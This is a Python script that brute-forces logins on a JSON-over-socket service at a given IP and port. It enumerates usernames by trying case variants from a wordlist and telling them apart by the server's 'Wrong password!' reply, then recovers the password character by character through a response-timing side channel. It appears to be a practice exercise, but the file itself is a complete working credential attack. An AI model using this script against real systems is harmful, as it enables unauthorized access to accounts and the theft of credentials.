import argparse
import itertools
import json
import socket
import string
import sys
import time

parser = argparse.ArgumentParser(description='Provide IP port')
parser.add_argument('IP', type=str)
parser.add_argument('port', type=int)

args = parser.parse_args()

IP = args.IP
port = args.port
address = (IP, port)

with open('logins.txt', 'r') as f:
    logins = f.readlines()

with socket.socket() as client:
    client.connect(address)
    LOGIN = False
    for login in logins:
        login = list(login.strip())
        new = []
        for i in login:
            if i.isdigit():
                new.append([i])
            else:
                new.append([i.upper(), i.lower()])
        message = itertools.product(*new)
        for mess in message:
            mess = ''.join(mess)
            info = {
                "login": mess,
                "password": " "
            }
            info = json.dumps(info)
            client.send(info.encode())
            start = time.time()
            response = client.recv(1024)
            end = time.time()
            delay_log = end - start
            if response.decode() == '{"result": "Wrong password!"}':
                LOGIN = mess
                break
        if LOGIN:
            break
    total = string.ascii_letters + string.digits
    password = []
    while True:
        for i in total:
            password.append(i)
            info = {
                "login": LOGIN,
                "password": ''.join(password)
            }
            info = json.dumps(info)
            client.send(info.encode())
            start = time.time()
            response = client.recv(1024)
            end = time.time()
            delay_pass = end - start
            if delay_pass > 2 * delay_log:
                break
            elif response.decode() == '{"result": "Connection success!"}':
                print(info)
                sys.exit()
            else:
                password.pop()
